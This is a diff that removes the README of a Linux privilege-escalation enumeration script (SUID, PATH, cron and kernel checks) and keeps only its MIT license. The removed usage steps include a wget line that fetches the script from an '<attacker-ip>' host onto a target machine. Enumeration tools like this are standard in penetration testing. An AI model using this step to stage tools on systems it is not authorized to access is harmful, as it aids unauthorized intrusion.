@@ -1,35 +1,3 @@
-# ZAR Privilege Escalation Helper Tool
-
-This is a beginner-friendly privilege escalation enumeration tool designed for Linux systems. It automatically checks for:
-- SUID binaries and matches them against GTFOBins
-- Writable paths in $PATH
-- Cron jobs
-- Kernel version and suggests known exploits using linux-exploit-suggester
-
-## Usage
-
-1. Upload the script to the target machine:
-```
-wget http://<attacker-ip>/privesc_helper.sh
-chmod +x privesc_helper.sh
-```
-
-2. (Optional) Place `linux-exploit-suggester.sh` in the same folder.
-
-3. Run the tool:
-```
-./privesc_helper.sh
-```
-
-4. Check the results in `privesc_report.txt`.
-
-## Notes
-
-- The script requires `curl`, `bash`, and `tee`.
-- It does not exploit automatically — it assists with clear enumeration.
-
-## License
-
 MIT License
 
 Copyright (c) 2025 ZAR
@@ -51,4 +19,3 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
-
